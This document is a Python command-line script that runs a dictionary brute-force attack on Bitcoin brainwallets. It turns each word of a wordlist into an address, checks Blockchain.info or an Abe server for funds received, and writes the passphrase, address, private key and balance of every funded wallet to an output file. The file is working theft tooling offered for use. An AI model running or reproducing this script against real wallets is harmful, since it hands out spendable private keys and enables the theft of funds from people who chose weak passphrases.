import codecs
import sys
import argparse
import logging
from blockchain import Abe,BlockchainInfo
from brainwallet import BrainWallet

def main():
    parser = argparse.ArgumentParser(description='A script to perform bruteforce dictionary attacks on brainwallets.')

    parser.add_argument('-t', action='store', dest='type',
                        help='Blockchain lookup type ({}|{})'
                        .format(Abe.STRING_TYPE, BlockchainInfo.STRING_TYPE), required=True)
    parser.add_argument('-d', action='store', dest='dict_file',
                        help='Dictionary file (one word per line)', required=True)
    parser.add_argument('-o', action='store', dest='output_file',
                        help='Output file (e.g. output.txt)', required=True)
    parser.add_argument('-s', action='store', dest='server',
                        help='Abe host address (e.g. localhost)')
    parser.add_argument('-p', action='store', dest='port',
                        help='Abe port (e.g. 2751)')
    parser.add_argument('-c', action='store', dest='chain',
                        help='Abe chain string (e.g. Bitcoin)')
    parser.add_argument('--version', action='version', version='%(prog)s 1.1')

    args = parser.parse_args()

    # Setup logging
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')

    # Check valid blockchain lookup type is specified
    if args.type != BlockchainInfo.STRING_TYPE and args.type != Abe.STRING_TYPE:
        logging.error("Invalid -t option specified.")
        sys.exit(1)

    # If abe is selected, make sure required options are given
    if args.type == Abe.STRING_TYPE:
        if not args.server:
            logging.error("Abe server (-s) must be specified.")
            sys.exit(1)
        if not args.port:
            logging.error("Abe port (-p) must be specified.")
            sys.exit(1)
        if not args.chain:
            logging.error("Abe chain (-c) must be specified.")
            sys.exit(1)

    # Choose connection type
    if args.type == Abe.STRING_TYPE:
        blockexplorer = Abe(args.server, args.port, args.chain)
    elif args.type == BlockchainInfo.STRING_TYPE:
        blockexplorer = BlockchainInfo()
    else:
        logging.error("Invalid lookup type specified '{}'".format(args.type))
        sys.exit(1)

    # Open session
    blockexplorer.open_session()

    # Open dictionary file for reading
    try:
        f_dictionary = codecs.open(args.dict_file,'r','utf8')
    except Exception as e:
        logging.error("Failed to open dictionary file {}. Error: {}".format(args.dict_file, e.args))
        sys.exit(1)

    # Open output file for found addresses
    try:
        f_found_addresses = codecs.open(args.output_file,'w','utf8')
    except Exception as e:
        logging.error("Failed to open output file {}. Error: {}".format(args.found_file, e.args))
        sys.exit(1)

    # Loop through dictionary
    for raw_word in f_dictionary:
        dictionary_word = raw_word.rstrip()
        if not dictionary_word:
            continue

        # Create brainwallet
        brain_wallet = BrainWallet(dictionary_word)

        # Get received bitcoins
        received_bitcoins = blockexplorer.get_received(brain_wallet.address)
        if received_bitcoins == 0:
            continue

        # Get current balance
        current_balance = blockexplorer.get_balance(brain_wallet.address)

        # Output results
        f_found_addresses.write("{}:{}:{}:{}\n".format(dictionary_word, brain_wallet.address, brain_wallet.private_key,
                                                       current_balance))
        logging.info("Found {} with received bitcoin total of {:.8f} using word {}. Current balance: {:.8f}"
              .format(brain_wallet.address, received_bitcoins, dictionary_word, current_balance))

    # Close files and connection
    blockexplorer.close_session()
    f_found_addresses.close()
    f_dictionary.close()

if __name__ == '__main__':
    main()